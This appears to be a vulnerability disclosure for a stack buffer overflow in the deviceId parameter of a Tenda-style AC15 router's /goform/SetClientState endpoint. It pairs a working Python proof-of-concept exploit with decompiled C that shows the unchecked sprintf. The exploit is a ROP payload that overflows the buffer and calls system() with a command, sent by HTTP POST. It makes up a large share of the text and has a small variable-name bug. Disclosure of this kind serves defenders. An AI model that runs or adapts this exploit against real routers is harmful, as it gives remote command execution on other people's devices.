111
## formSetSpeedWan

### Affected product

```
AC15V15.03.05.19
```

### poc

```python
import requests
from pwn import *
cmd=b"echo hello! "
libc_base=0xf659c000


system_offset = 0x5a270
gadget1_offset = 0x18298
gadget2_offset = 0x40cb8
system_addr = libc_base + system_offset
gadget1 = libc_base + gadget1_offset
gadget2 = libc_base + gadget2_offset

#cmd=bin_sh+libc_base
payload="A"*590 +p32(gadget1)+p32(system_addr) +p32(gadget2)+cmd
url="http://192.168.0.119/goform/SetClientState"
cookie={"Cookie":"password=12345"}
data={"limitEn":"1","deviceId":payload,"limitSpeedUp":"a","limitSpeed":"a"}

reponse=requests.post(url,cookies=cookie,data=data)

print(response.text)

```

### Details

```
/goform/SetClientState，deviceId is controllable and will eventually be spliced into s by sprintf. It is worth noting that the size is not checked, resulting in a stack overflow vulnerability
```



```c
  v9 = (const char *)sub_2BA8C(a1, (int)"deviceId", (int)&byte_E235C);
  nptr = (char *)sub_2BA8C(a1, (int)"limitEn", (int)"0");
  v11 = (const char *)sub_2BA8C(a1, (int)"limitSpeed", (int)"0");
  v10 = (const char *)sub_2BA8C(a1, (int)"limitSpeedUp", (int)"0");
 if ( v9 )
  {
    if ( sub_7D650(v9, &v4) == 1 )
    {
      v8 = 1;
      sprintf((char *)v5, "{\"errCode\":%d}", 1);
      result = sub_9CB14(a1, v5);
    }
    else
    {
      if ( atoi(nptr) )
      {
        v2 = atoi(nptr);
        sprintf(s, "%d;%s;%s;%s", v2, v9, v10, v11);
```

